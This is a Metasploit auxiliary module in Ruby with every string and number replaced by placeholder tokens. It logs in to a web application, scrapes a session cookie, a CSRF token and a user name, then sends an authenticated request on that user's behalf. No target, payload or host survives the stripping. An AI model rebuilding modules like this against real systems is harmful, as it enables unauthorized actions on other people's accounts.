require <str> class Metasploit4 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) register_options ( [ Opt :: RPORT ( <int> ) , OptBool . new ( <str> , [ true , <str> , true ] ) , OptString . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ true , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def run print_status ( <str> target_url <str> ) res = send_request_cgi ( <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> , <str> ) , <str> = > { <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] } ) if res . nil? print_error ( <str> ) return end if res . headers [ <str> ] =~ <str> print_error ( <str> ) return else session = $1 if res . get_cookies =~ <str> if session . nil? print_error ( <str> ) return end end print_status ( <str> ) res = send_request_cgi ( <str> = > <str> session <str> , <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> ) ) if res . nil? print_error ( <str> ) return end if res . headers [ <str> ] =~ <str> print_error ( <str> ) return else session = $1 if res . get_cookies =~ <str> if session . nil? print_error ( <str> ) return end end if res . headers [ <str> ] =~ <str> print_error ( <str> ) return else csrf_token = $1 if res . body =~ <str> csrf_token = $1 if res . body =~ <str> if csrf_token . nil? if csrf_token . nil? print_error ( <str> ) return end user = $1 if res . body =~ <str> datastore [ <str> ] <str> if user . nil? print_error ( <str> ) return end end print_status ( <str> target_url ( <str> , user , <str> ) <str> ) res = send_request_cgi ( <str> = > <str> session <str> , <str> = > { <str> = > csrf_token } , <str> = > <str> , <str> = > normalize_uri ( target_uri . path , <str> , user , <str> ) , <str> = > { <str> = > <str> } ) if res . nil? print_error ( <str> ) return end if res . headers [ <str> ] =~ <str> print_good ( <str> ) else print_error ( <str> ) end end def target_url ( * args ) ( ssl ? <str> : <str> ) + if rport . to_i == <int> || rport . to_i == <int> <str> vhost <str> else <str> vhost <str> rport <str> end + normalize_uri ( target_uri . path , * args ) end end 
